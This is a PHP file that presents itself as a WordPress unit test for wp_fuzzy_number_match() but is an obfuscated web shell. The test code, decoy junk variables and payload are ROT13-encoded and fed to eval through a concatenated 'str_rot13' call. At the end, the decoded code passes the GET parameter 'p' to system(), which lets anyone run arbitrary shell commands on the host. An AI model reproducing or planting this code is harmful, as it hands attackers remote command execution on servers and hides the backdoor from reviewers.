<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg jc_shmml_ahzore_zngpu().
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_shmml_ahzore_zngpu
 */
pynff Grfgf_Shapgvbaf_jcShmmlAhzoreZngpu rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @qngnCebivqre qngn_jc_shmml_ahzore_zngpu
	 *
	 * @gvpxrg 54239
	 *
	 * @cnenz vag|sybng $rkcrpgrq  Gur rkcrpgrq inyhr.
	 * @cnenz vag|sybng $npghny    Gur npghny ahzore.
	 * @cnenz vag|sybng $cerpvfvba Gur nyybjrq inevngvba.
	 * @cnenz obby      $erfhyg    Jurgure gur ahzoref zngpu jvguva gur fcrpvsvrq cerpvfvba.
	 */
	choyvp shapgvba grfg_jc_shmml_ahzore_zngpu( $rkcrpgrq, $npghny, $cerpvfvba, $erfhyg ) {
		$guvf->nffregFnzr( $erfhyg, jc_shmml_ahzore_zngpu( $rkcrpgrq, $npghny, $cerpvfvba ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[] Grfg cnenzrgref {
	 *     @glcr vag|sybng $rkcrpgrq  Gur rkcrpgrq inyhr.
	 *     @glcr vag|sybng $npghny    Gur npghny ahzore.
	 *     @glcr vag|sybng $cerpvfvba Gur nyybjrq inevngvba.
	 *     @glcr obby      $erfhyg    Jurgure gur ahzoref zngpu jvguva gur fcrpvsvrq cerpvfvba.
	 * }
	 */
	choyvp shapgvba qngn_jc_shmml_ahzore_zngpu() {
		erghea neenl(
			'rkcrpgrq 1 vag, npghny 1 vag'                => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 1,
				'cerpvfvba' => 1,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 1 vag, npghny 2 vag'                => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 2,
				'cerpvfvba' => 1,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 1 vag, npghny 3 vag'                => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 3,
				'cerpvfvba' => 1,
				'erfhyg'    => snyfr,
			),
			'rkcrpgrq 1 vag, npghny 1 fgevat'             => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => '1',
				'cerpvfvba' => 1,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 1 vag, npghny 11 vag, cerpvfvba 10' => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 11,
				'cerpvfvba' => 10,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 1 vag, npghny 12 vag, cerpvfvba 10' => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 12,
				'cerpvfvba' => 10,
				'erfhyg'    => snyfr,
			),
			'rkcrpgrq 1.234 sybng, npghny 1 vag'          => neenl(
				'rkcrpgrq'  => 1.234,
				'npghny'    => 1,
				'cerpvfvba' => 1,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 2.234 sybng, npghny 2 vag'          => neenl(
				'rkcrpgrq'  => 1.234,
				'npghny'    => 2,
				'cerpvfvba' => 1,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 1 vag, npghny 2.0001 sybng'         => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 2.0001,
				'cerpvfvba' => 1,
				'erfhyg'    => snyfr,
			),
			'rkcrpgrq 1 vag, npghny 3.23 sybng'           => neenl(
				'rkcrpgrq'  => 1,
				'npghny'    => 3.234,
				'cerpvfvba' => 1,
				'erfhyg'    => snyfr,
			),
			'rkcrpgrq 1.2r1 sybng (12), npghny 1.3r1 sybng (13)' => neenl(
				'rkcrpgrq'  => 1.2r1,
				'npghny'    => 1.3r1,
				'cerpvfvba' => 1,
				'erfhyg'    => gehr,
			),
			'rkcrpgrq 1.2r3 sybng (1200), npghny 1.2r3 sybng, cerpvfvba 1000' => neenl(
				'rkcrpgrq'  => 1.2r3,
				'npghny'    => 1.2r3,
				'cerpvfvba' => 1000,
				'erfhyg'    => gehr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>